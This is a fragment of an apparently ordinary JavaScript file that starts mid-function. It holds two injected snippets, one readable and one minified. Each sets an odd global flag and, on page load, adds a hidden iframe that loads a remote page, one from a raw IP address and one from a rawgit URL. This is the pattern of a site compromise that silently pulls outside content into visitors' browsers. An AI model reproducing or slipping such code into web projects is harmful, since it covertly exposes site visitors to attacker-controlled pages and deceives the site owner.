	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});